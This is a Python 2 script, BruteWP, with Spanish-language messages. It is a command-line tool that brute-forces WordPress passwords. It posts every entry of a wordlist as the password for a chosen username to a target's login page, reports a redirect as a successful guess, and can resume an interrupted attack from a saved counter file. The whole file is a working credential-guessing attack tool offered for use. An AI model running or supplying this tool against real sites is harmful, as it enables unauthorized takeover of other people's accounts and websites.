#!/usr/bin/python
#coding:utf-8
import argparse
import requests
from urlparse import urlparse

def reportarError(error):
    print """[*] ERROR!

Por favor, reporta este error:

{barras}
{error}
{barras}

En https://github.com/samuelproject/BruteWP/issues

Gracias por tu colaboracion!
""".format(error=error.message, barras="-"*len(error.message))


def attack(target, usuario, diccionario, restaurar = False):

    target = urlparse(target)

    if target.scheme == "":
        target = "http://{}".format(target.geturl())
    else:
        target = target.geturl()

    print "[*] Target: {}\n".format(target)

    diccionario = open(diccionario, 'r')
    diccionario = diccionario.readlines()

    iteracion = open('iteracion.txt','a+')
    iteracion.seek(0,0)
    contenido_iteracion = iteracion.readlines()

    if len(contenido_iteracion) == 0:
        iteracion.write("1\n")
        iteracion.close()
        
    iteracion = open('iteracion.txt','r+')
    contenido_iteracion = iteracion.readlines()
    iteracion.close()

    aux = diccionario
    cont = 1
    encontrado = False

    if restaurar:
        print "[*] Restaurando ataque...\n"
        ultimo_valor_iteracion = int(str(contenido_iteracion[len(contenido_iteracion)-1]).strip())
        aux = aux[ultimo_valor_iteracion-1:]
        if len(aux) == 0:
            cont = 1
            aux = diccionario
        else:
            cont = ultimo_valor_iteracion

    
    for password in aux:
        with open('iteracion.txt','w') as iteracion:
            try:
                cabeceras = {
                    "Content-type": "application/x-www-form-urlencoded",
                    "Accept": "text/plain"
                }

                payload = {
                    'log': usuario.strip(),
                    'pwd': password.strip()
                }

                response = requests.post(target, data=payload, headers=cabeceras, allow_redirects=False)

                if response.status_code in [302, 303]:
                    print '[%d] - Password: %s <----- BruteWP ha ENCONTRADO el password :)' % (cont,password.strip())
                    cont = 0
                    encontrado = True
                    break
                elif response.status_code == 200:
                    print '[%d] - Password: %s' % (cont,password.strip())
                else:
                    print 'Error!!!!'

            except KeyboardInterrupt:
                print '\n[*] Ejecución terminada por el teclado'
                cont -= 1
                exit()
            except Exception as e:
                reportarError(e)
                exit()
            finally:
                cont += 1
                iteracion.write(str(cont)+'\n')

    if not encontrado:
        print "\nNo se ha podido encontrar el password. Intenta usar otro diccionario.\n"


def conexion():
    parser = argparse.ArgumentParser(
            usage="./BruteWP.py -t [target] -u [usuario] -w [diccionario]",
            add_help=False,        
    )
    parser.add_argument("-h", "--help", action="help", help="Mostrar este mensaje de ayuda y salir")
    parser.add_argument("-t", dest='target', help="Target a atacar. Ejemplo: www.sitewordpress/wp-login.php")
    parser.add_argument("-u", dest='usuario', help="Nombre de usuario de WordPress")
    parser.add_argument("-w", dest='diccionario', help="Diccionario para realizar el ataque")
    parser.add_argument("-r", dest='restaurar', action="store_true", help="Restaura la última sesión del ataque")
    args = parser.parse_args()
    
    autores = ['@Samuel.E']
    colaboradores = ['@aperezalbela']

    print """
 ____             _     __        ______  
| __ ) _ __ _   _| |_ __\ \      / /  _ \ 
|  _ \| '__| | | | __/ _ \ \ /\ / /| |_) |
| |_) | |  | |_| | ||  __/\ V  V / |  __/ 
|____/|_|   \__,_|\__\___| \_/\_/  |_|    
                                        v 1.1
                                        Por: {autores}
                                        Colaboradores: {colaboradores}
    """.format(
        autores=', '.join(autores),
        colaboradores=', '.join(colaboradores)
    )
    
    if args.target and args.usuario and args.diccionario:
        attack(args.target, args.usuario, args.diccionario, args.restaurar)
    else:
        parser.print_help()


if __name__ == '__main__':
    conexion()
